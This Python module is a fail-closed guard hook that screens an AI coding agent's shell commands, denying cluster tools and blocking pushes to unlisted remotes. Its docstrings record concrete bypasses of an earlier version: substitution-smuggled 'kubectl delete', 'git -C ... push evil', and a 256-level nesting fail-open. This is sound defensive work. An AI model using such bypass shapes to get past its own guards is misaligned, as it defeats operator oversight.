"""Command-safety analysis for the PreToolUse guard (charter C-1 / C-5).

The bash wrapper (``scripts/pretooluse_guard.sh``) is deliberately thin: it
pipes the PreToolUse JSON payload here and translates the verdict into an exit
code. All tokenization, classification and destination resolution live in this
module, in one place, in a language with a real shell lexer.

WHY THIS IS NOT A REGEX. The first implementation split the command with
``sed`` and matched dangerous tokens with an ERE. Four measured bypasses
followed, every one of them a tokenizer failure rather than a pattern failure::

    kubectl delete ns $(git rev-parse --abbrev-ref HEAD)      # ALLOWED
    helm upgrade rel ./chart --set sha=$(git rev-parse HEAD)  # ALLOWED
    terraform apply -var git_sha=$(git rev-parse HEAD)        # ALLOWED
    git -C /somewhere push evil main                          # ALLOWED

The first three smuggled a dangerous verb past the check by co-locating the
token ``git`` in the same segment (the push branch resolved ``origin``,
allow-listed, and continued); the fourth hid the ``push`` verb behind a flag
value containing ``/``. Command substitutions were never separated at all. A
guard that must reason about shell syntax needs a shell lexer, so this module
uses :mod:`shlex` and treats every failure to understand as a BLOCK.

VERDICT MODEL
    - ``allow``  — no governed token anywhere, or every governed segment is an
      enumerated read-only form.
    - ``block``  — anything else, including anything unparseable. Fail closed.

The ``.claude/settings.json`` deny-list remains the authoritative C-1 layer and
the native pre-push hook the authoritative C-5 layer; this is the first-pass
filter that also catches compound shapes the tool-permission matcher cannot see.
"""

from __future__ import annotations

import json
import re
import shlex
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Final

from orbital_drift import remotes

# --- policy (single home; mirrors .claude/settings.json's deny-list) ---------

#: Commands denied in EVERY mode. The settings deny-list blocks these outright
#: (including the ``--dry-run=client``/``lint`` forms the constitution permits
#: in principle), and this guard must never be looser than that layer
#: (CLAUDE.md prime constraint 1: hand those to the operator).
ALWAYS_DENIED: Final[frozenset[str]] = frozenset({"kubectl", "k3s", "k9s", "argo", "argocd"})

#: Commands that are denied unless the invocation matches an enumerated
#: read-only form below. Anything not enumerated blocks (fail closed).
CONDITIONAL: Final[frozenset[str]] = frozenset({"helm", "terraform", "kustomize"})

#: The complete set of permitted read-only invocations, as argv prefixes.
#: CLAUDE.md: "Local validation is therefore helm template + kubeconform +
#: terraform validate + yamllint only."
READONLY_FORMS: Final[tuple[tuple[str, ...], ...]] = (
    ("helm", "template"),
    ("helm", "lint"),
    ("terraform", "validate"),
    ("terraform", "fmt"),
    ("terraform", "init"),
)

#: Flags that make an otherwise-permitted read-only form unsafe.
FORBIDDEN_FLAGS: Final[dict[tuple[str, ...], tuple[str, ...]]] = {
    # `terraform init` without -backend=false initializes a real backend.
    ("terraform", "init"): ("-backend=false",),
}

#: Wrapper commands stripped before classifying a segment, so
#: `sudo kubectl ...` and `env FOO=1 kubectl ...` cannot hide the real verb.
WRAPPERS: Final[frozenset[str]] = frozenset(
    {"sudo", "env", "command", "builtin", "exec", "nohup", "time", "nice", "xargs", "watch"}
)

#: Interpreters whose `-c` argument is CODE, not data. A quoted string reaching
#: `git commit -m` is data and is allowed; the identical string reaching
#: `bash -c` is a command line and is re-analyzed recursively.
SHELLS: Final[frozenset[str]] = frozenset({"bash", "sh", "zsh", "dash", "ksh", "ash"})

#: Shell operators that separate one command from the next.
_OPERATORS: Final[tuple[str, ...]] = ("&&", "||", ";;", ";", "|&", "|", "&", "\n")

#: Substitution wrappers whose CONTENTS are themselves commands.
_SUBSTITUTION = re.compile(r"\$\(([^()]*)\)|`([^`]*)`|\$\{[^}]*\}")

#: `git push` recognition: the verb, wherever it sits among git's own globals.
_GIT: Final = "git"
_PUSH: Final = "push"

#: Recursion ceiling for nested interpreters (`bash -c "sh -c '...'"`).
#: Deeper than this is not a legitimate shape; refuse rather than recurse.
_MAX_DEPTH: Final = 4

#: Work ceiling for the segment queue, so a pathological input cannot spin.
#: Far above any real command line; reaching it means the input is adversarial
#: or malformed, and the caller blocks either way.
_MAX_SEGMENTS: Final = 512

#: How much of a command a diagnostic may quote. The inputs that reach the
#: truncation block are kilobytes of `$(`, and this text lands on an operator's
#: stderr: enough to recognize the command, never the whole payload.
_EXCERPT_CHARS: Final = 120


@dataclass(frozen=True)
class Verdict:
    """The guard's decision about one payload."""

    blocked: bool
    constraint: str = ""
    reason: str = ""
    segment: str = ""

    def render(self) -> str:
        if not self.blocked:
            return "ALLOW"
        return f"BLOCKED ({self.constraint}): {self.reason}"


def _split_segments(command: str) -> tuple[list[str], bool]:
    """Split a command line into segments, reporting ceiling truncation.

    Returns ``(segments, truncated)``. ``truncated`` is True iff
    :data:`_MAX_SEGMENTS` stopped the loop with work still queued, which means
    the list is INCOMPLETE: some part of the command was never unwrapped, and
    nothing in the list says which part. Policy callers must read that as
    "could not analyse" and fail closed.

    This is the checked form because the unchecked one shipped a fail-open
    (RB-009). Each nesting level costs two iterations of the queue below (the
    lifted body is queued AND the stripped remainder is re-queued), and the
    queue is LIFO, so the body lifted first is popped last: 256 nested
    substitutions exhausted the 512-iteration ceiling before the innermost
    command was ever examined, the split came back EMPTY, and
    :func:`analyze` read an empty list as nothing to object to.
    """
    segments: list[str] = []
    pending = [command]
    guard_rail = 0
    while pending and guard_rail < _MAX_SEGMENTS:
        guard_rail += 1
        current = pending.pop()
        lifted: list[str] = []

        # Lift substitution bodies out, replacing each with a space so the
        # remainder still tokenizes. The body pattern excludes parentheses, so
        # only the INNERMOST substitution matches on a given pass; when
        # anything was lifted the remainder goes back on the queue to be
        # re-scanned, which is what unwraps `a $(b $(c))` all the way down.
        def _lift(match: re.Match[str], sink: list[str] = lifted) -> str:
            body = match.group(1) or match.group(2)
            if body:
                sink.append(body)
            return " "

        stripped = _SUBSTITUTION.sub(_lift, current)
        pending.extend(lifted)
        if lifted:
            pending.append(stripped)
            continue

        # Fully unwrapped: split the remainder on operators.
        parts = [stripped]
        for operator in _OPERATORS:
            parts = [piece for part in parts for piece in part.split(operator)]
        segments.extend(part.strip() for part in parts if part.strip())
    # Anything still queued is work the ceiling cut short, not work that came
    # back clean. The loop can also exit exactly at the ceiling with the queue
    # drained — that split IS complete, so the flag is the queue, not the count.
    return segments, bool(pending)


def split_segments(command: str) -> list[str]:
    """Split a command line into independently-judged segments.

    Splits on shell operators AND lifts the contents of every command
    substitution into its own segment, recursively — ``$( )`` and backticks are
    where the measured bypasses hid. Parameter expansions (``${VAR}``) are
    dropped rather than lifted: they expand to data, not commands.

    TRUNCATION IS INVISIBLE IN THIS RETURN SHAPE, and that is load-bearing: at
    :data:`_MAX_SEGMENTS` the list simply comes back short — possibly EMPTY —
    with nothing to distinguish "this command contains nothing to object to"
    from "most of this command was never read". A caller that loops over the
    result cannot tell the two apart, which is precisely how a denied command
    wrapped in 256 substitutions won an ALLOW verdict (RB-009). Use this form
    for display and diagnostics only; every POLICY caller must use
    :func:`_split_segments` and block when ``truncated`` is True.
    """
    segments, _ = _split_segments(command)
    return segments


def _excerpt(command: str) -> str:
    """A bounded, quotable slice of a command for a verdict or a trace."""
    if len(command) <= _EXCERPT_CHARS:
        return command
    return f"{command[:_EXCERPT_CHARS]}... (+{len(command) - _EXCERPT_CHARS} more characters)"


def _argv(segment: str) -> list[str] | None:
    """Tokenize one segment; ``None`` when the shell lexer cannot parse it."""
    try:
        argv = shlex.split(segment, comments=True)
    except ValueError:
        return None
    # Drop leading VAR=value assignments and wrapper commands.
    while argv:
        head = argv[0]
        if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", head) or head in WRAPPERS:
            argv = argv[1:]
            continue
        break
    return argv


def _basename(word: str) -> str:
    """`/usr/bin/kubectl` and `./kubectl` both classify as `kubectl`."""
    return Path(word).name


def _mentions_denied(argv: list[str]) -> str | None:
    """Return the first always-denied command appearing as a WORD in argv.

    Word-level, post-lexing: ``git commit -m "kubectl apply -f x"`` lexes to a
    single argument ``kubectl apply -f x``, which is data and is allowed — the
    quoted-mention false positive the regex implementation suffered is gone.
    Code that merely *looks* quoted but is executed (``bash -c "kubectl ..."``)
    is caught by the SHELLS branch in :func:`analyze`, which re-analyzes the
    payload instead of trusting the quoting.

    Checked across the whole argv rather than position 0 so an argument
    position cannot hide the verb (``xargs kubectl delete`` survives wrapper
    stripping; ``foo --exec kubectl`` still blocks).
    """
    for word in argv:
        if _basename(word) in ALWAYS_DENIED:
            return _basename(word)
    return None


def _readonly_prefix(argv: list[str]) -> tuple[str, ...] | None:
    """The enumerated read-only form this argv matches, if any.

    Matching is on the argv PREFIX (command + subcommand), so arguments are
    free-form — but a form listed in :data:`FORBIDDEN_FLAGS` additionally
    requires its safety flag to be present, which is what keeps
    ``terraform init`` (initializes a real backend) from riding in on
    ``terraform init -backend=false``'s permission.
    """
    for form in READONLY_FORMS:
        if len(argv) < len(form):
            continue
        candidate = (_basename(argv[0]), *argv[1 : len(form)])
        if candidate != form:
            continue
        required = FORBIDDEN_FLAGS.get(form)
        if required and not any(flag in argv for flag in required):
            return None
        return form
    return None


def _push_destination(argv: list[str]) -> str:
    """The remote named by a ``git push`` argv; ``""`` when none is given.

    Never guesses ``origin``: assuming a default is exactly how
    ``git -c user.name=x push evil`` was measured to pass. A bare ``git push``
    returns ``""`` so the caller can substitute the effective remote the
    wrapper resolved from git config, and block when even that is unknown.
    """
    index = argv.index(_PUSH)
    for candidate in argv[index + 1 :]:
        if candidate.startswith("-"):
            continue
        return candidate
    return ""


def analyze(
    command: str, *, allowlist: Path, effective_remote: str = "", _depth: int = 0
) -> Verdict:
    """Judge one command string. Every uncertain path returns a BLOCK."""
    if _depth > _MAX_DEPTH:
        return Verdict(True, "C-1", "command nests interpreters too deeply to analyze")
    segments, truncated = _split_segments(command)
    if truncated:
        # The segmenter ran out of budget with the command half-unwrapped, so
        # the list below is not evidence of anything. Refuse, exactly as the
        # depth ceiling above does — an unread command is not a safe one.
        # No single segment is to blame, so name the COMMAND instead — bounded,
        # because these payloads run to kilobytes. It goes into the REASON as
        # well as the segment field: `Verdict.render()` formats the constraint
        # and the reason and nothing else, which is why every other block
        # interpolates its segment there too (`...; segment: {segment}`). A
        # field nothing renders would leave this the only block on the
        # operator's stderr that identifies nothing at all.
        excerpt = _excerpt(command)
        return Verdict(
            True,
            "C-1",
            f"command exceeds the {_MAX_SEGMENTS}-segment work ceiling; "
            f"refusing to analyze a command that could not be fully split; "
            f"command: {excerpt}",
            excerpt,
        )
    for segment in segments:
        argv = _argv(segment)
        if argv is None:
            return Verdict(
                True, "C-1", f"segment cannot be tokenized (unbalanced quoting): {segment}", segment
            )
        if not argv:
            continue

        denied = _mentions_denied(argv)
        if denied is not None:
            return Verdict(
                True, "C-1", f"{denied} is denied in every mode; segment: {segment}", segment
            )

        head = _basename(argv[0])

        # `bash -c "<code>"` executes its argument: analyze it as a command,
        # not as a string. Without this, every rule here is one `sh -c` away
        # from irrelevance.
        if head in SHELLS and "-c" in argv:
            index = argv.index("-c")
            if index + 1 >= len(argv):
                return Verdict(
                    True,
                    "C-1",
                    f"{head} -c with no argument to analyze; segment: {segment}",
                    segment,
                )
            nested = analyze(
                argv[index + 1],
                allowlist=allowlist,
                effective_remote=effective_remote,
                _depth=_depth + 1,
            )
            if nested.blocked:
                return nested
            continue

        if head == _GIT and _PUSH in argv:
            destination = _push_destination(argv)
            if destination == "":
                destination = effective_remote
            if not destination:
                return Verdict(
                    True,
                    "C-5",
                    f"push destination could not be resolved; segment: {segment}",
                    segment,
                )
            verdict = _check_remote(destination, allowlist)
            if verdict is not None:
                return verdict
            continue

        if head in CONDITIONAL:
            if _readonly_prefix(argv) is None:
                return Verdict(
                    True,
                    "C-1",
                    f"{head} invocation is not an enumerated read-only form; segment: {segment}",
                    segment,
                )
            continue

    return Verdict(False)


def _check_remote(destination: str, allowlist: Path) -> Verdict | None:
    """``None`` when the destination is allow-listed; a BLOCK verdict otherwise."""
    try:
        permitted = remotes.is_allowlisted(destination, allowlist)
    except OSError as error:
        return Verdict(True, "C-5", f"allowlist unreadable ({error}) — failing closed")
    if not permitted:
        return Verdict(
            True,
            "C-5",
            f"push destination {destination!r} is not in {allowlist.name}",
        )
    return None


def main(argv: list[str] | None = None) -> int:
    """Read a PreToolUse payload on stdin; exit 2 to block, 0 to allow."""
    import argparse

    parser = argparse.ArgumentParser(description="PreToolUse command guard")
    parser.add_argument("--allowlist", required=True, type=Path)
    parser.add_argument(
        "--effective-remote",
        default="",
        help="remote a bare `git push` resolves to, supplied by the wrapper",
    )
    parser.add_argument("--debug", action="store_true", help="trace segments to stderr")
    args = parser.parse_args(argv)
    allowlist: Path = args.allowlist
    effective_remote: str = args.effective_remote
    debug: bool = args.debug

    payload = sys.stdin.read()
    try:
        data = json.loads(payload)
        command = str(data.get("tool_input", {}).get("command", ""))
    except (ValueError, AttributeError):
        # Unanalyzable payload: fail closed iff the RAW text is dangerous-shaped.
        raw = payload.lower()
        if any(token in raw for token in (*ALWAYS_DENIED, *CONDITIONAL, "git push")):
            sys.stderr.write(
                "BLOCKED (C-1): unanalyzable payload contains a dangerous-shaped pattern\n"
            )
            return 2
        return 0

    if not command:
        return 0

    if debug:
        # The CHECKED form, deliberately: tracing through the public one meant
        # a truncated payload printed no segment lines and no explanation for
        # their absence — a block with no visible evidence, in the one case
        # where the operator most needs to see why (RB-009).
        traced, traced_truncated = _split_segments(command)
        for segment in traced:
            sys.stderr.write(f"guard: segment={segment!r}\n")
        if traced_truncated:
            sys.stderr.write(
                f"guard: TRUNCATED after {len(traced)} segments at the "
                f"{_MAX_SEGMENTS}-segment ceiling; the rest was never read: "
                f"{_excerpt(command)!r}\n"
            )

    verdict = analyze(command, allowlist=allowlist, effective_remote=effective_remote)
    if verdict.blocked:
        sys.stderr.write(verdict.render() + "\n")
        return 2
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
